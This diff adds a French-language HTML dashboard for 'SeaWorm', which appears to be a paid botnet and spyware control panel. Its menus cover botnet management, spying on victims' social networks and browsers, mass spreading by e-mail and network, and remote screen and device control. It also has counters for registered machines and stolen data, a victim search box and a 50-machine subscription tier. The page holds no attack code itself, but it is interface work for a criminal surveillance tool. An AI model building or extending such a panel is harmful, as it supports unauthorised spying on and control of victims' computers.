@@ -1,0 +1,249 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <link rel="stylesheet" href="index.css" />
+  <title>Panel</title>
+</head>
+
+<body>
+  <main>
+    <div class="panel-left" id="panel-left">
+      <div class="links-panel">
+        <h1>SeaWorm</h1>
+        <div class="underline"></div>
+        <div class="category-panel">
+          <div class="category dashboard">
+            <h2>Tableau de bord</h2>
+            <div class="links">
+              <ul>
+                <li><i class="fa-solid fa-globe"></i>
+                  <p>Général</p>
+                </li>
+                <li><i class="fa-solid fa-pen-to-square"></i>
+                  <p>Génération</p>
+                </li>
+                <li><i class="fa-solid fa-network-wired"></i>
+                  <p>Botnet</p>
+                </li>
+                <li><i class="fa-solid fa-gear"></i>
+                  <p>Paramètres</p>
+                </li>
+              </ul>
+            </div>
+          </div>
+          <div class="category spy">
+            <h2>Espionnage</h2>
+            <div class="links">
+              <ul>
+                <li><i class="fa-solid fa-users-viewfinder"></i>
+                  <p>Réseaux sociaux</p>
+                </li>
+                <li><i class="fa-solid fa-magnifying-glass"></i>
+                  <p>Navigateurs</p>
+                </li>
+                <li><i class="fa-solid fa-hourglass-start"></i>
+                  <p>Temps réel</p>
+                </li>
+              </ul>
+            </div>
+          </div>
+          <div class="category share">
+            <h2>Partage de masse</h2>
+            <div class="links">
+              <ul>
+                <li><i class="fa-solid fa-envelope"></i>
+                  <p>E-mail</p>
+                </li>
+                <li><i class="fa-solid fa-photo-film"></i>
+                  <p>Médias</p>
+                </li>
+                <li><i class="fa-solid fa-ethernet"></i>
+                  <p>Réseau</p>
+                </li>
+              </ul>
+            </div>
+          </div>
+          <div class="category control">
+            <h2>Contrôle</h2>
+            <div class="links">
+              <ul>
+                <li><i class="fa-brands fa-chromecast"></i>
+                  <p>Partage d'écran</p>
+                </li>
+                <li><i class="fa-solid fa-display"></i>
+                  <p>Appareils</p>
+                </li>
+                <li><i class="fa-solid fa-timeline"></i>
+                  <p>Temps réel</p>
+                </li>
+              </ul>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <i class="fa-solid fa-bars" id="button-left"></i>
+    <div class="panel-center">
+      <h3 class="title-panel">Informations générales</h3>
+      <div class="informations-general">
+        <div class="box">
+          <div class="header">
+            <i class="fa-solid fa-computer"></i>
+            <i class="fa-solid fa-ellipsis-vertical"></i>
+          </div>
+          <div class="body">
+            <h2>0</h2>
+            <p>Machines enregistrées</p>
+          </div>
+        </div>
+        <div class="box">
+          <div class="header">
+            <i class="fa-solid fa-layer-group"></i>
+            <i class="fa-solid fa-ellipsis-vertical"></i>
+          </div>
+          <div class="body">
+            <h2>0 KO</h2>
+            <p>Données récupérées</p>
+          </div>
+        </div>
+        <div class="box">
+          <div class="header">
+            <i class="fa-solid fa-thumbs-up"></i>
+            <i class="fa-solid fa-ellipsis-vertical"></i>
+          </div>
+          <div class="body">
+            <h2>0</h2>
+            <p>Réseaux enregistrés</p>
+          </div>
+        </div>
+        <div class="box need-help">
+          <div class="header">
+            <i class="fa-solid fa-lightbulb"></i>
+            <i class="fa-solid fa-ellipsis-vertical"></i>
+          </div>
+          <div class="body">
+            <p>Besoins d'aide?</p>
+          </div>
+        </div>
+      </div>
+      <div class="subscription-con">
+        <div class="box device-limit">
+          <div class="header">
+            <div class="title">
+              <p>Machines enregistrées</p>
+            </div>
+          </div>
+          <div class="body">
+            <p class="description">Il vous reste <span id="reamingComputer"></span> machines.</p>
+            <div class="progress">
+              <span id="machineNumber"></span>
+              <div class="progress-container">
+                <div class="progress-bar" id="bar1">
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+        <div class="box device-limit-sub">
+          <div class="header">
+            <div class="title">
+              <p>Abonnement</p>
+            </div>
+            <div class="second-title">
+              <p>Mensuel</p>
+            </div>
+            <i class="fa-solid fa-ellipsis-vertical"></i>
+          </div>
+          <div class="body">
+            <p class="description">Limite de <span id="limitComputer"></span> machines.</p>
+            <div class="progress">
+              <span id="machines_Number"></span>
+              <div class="progress-container">
+                <div class="progress-bar" id="bar2"></div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+      <h3 class="title-panel">Logs</h3>
+      <div class="logs-section">
+        <div class="logs-con">
+          <div class="log-con">
+            <div class="log-data">
+              <table>
+                <thead>
+                  <tr>
+                    <th>Nom</th>
+                    <th>IP</th>
+                    <th>Action</th>
+                    <th>Réponse</th>
+                    <th>Date</th>
+                    <th>Données</th>
+                    <th>Résultat</th>
+                  </tr>
+                </thead>
+                <tbody class="log-body" id="logs-body">
+
+                </tbody>
+              </table>
+            </div>
+          </div>
+
+        </div>
+      </div>
+    </div>
+    <i class="fa-solid fa-bars" id="button-right"></i>
+    <div class="panel-right">
+      <div class="panel-content">
+        <div class="header">
+          <div class="dropdown-con">
+            <div class="dropdown">
+              <div class="select">
+                <input type="text" id="search-input" placeholder="Rechercher une victime" autocomplete="off">
+              </div>
+              <input type="hidden" name="category">
+              <div class="logs-con dropdown-menu">
+                <div class="log-con">
+                  <div class="log-data">
+                    <table>
+                      <thead>
+                        <tr>
+                          <th>Nom</th>
+                          <th>Date</th>
+                          <th>Satut</th>
+                          <th>Pays</th>
+                          <th>Données</th>
+                        </tr>
+                      </thead>
+                      <tbody class="log-body list-device" id="log-body">
+
+                      </tbody>
+                    </table>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+          <div class="options">
+            <i class="fa-regular fa-comment-dots"></i>
+            <i class="fa-solid fa-bell"></i>
+            <i class="fa-solid fa-gear"></i>
+          </div>
+          <div class="underline"></div>
+          <div class="profile-picture">
+            <img src="#">
+          </div>
+          <p class="username-profile">Username</p>
+          <p class="info-sub">Version payante du logiciel <br>( limite de 50 machines )</p>
+          <p class="info-wl">Vous êtes sur la whitelist</p>
+        </div>
+  </main>
+  <script src="./index.js"></script>
+  <script src="https://kit.fontawesome.com/c434dacbe0.js" crossorigin="anonymous"></script>
+</body>
+
+</html>
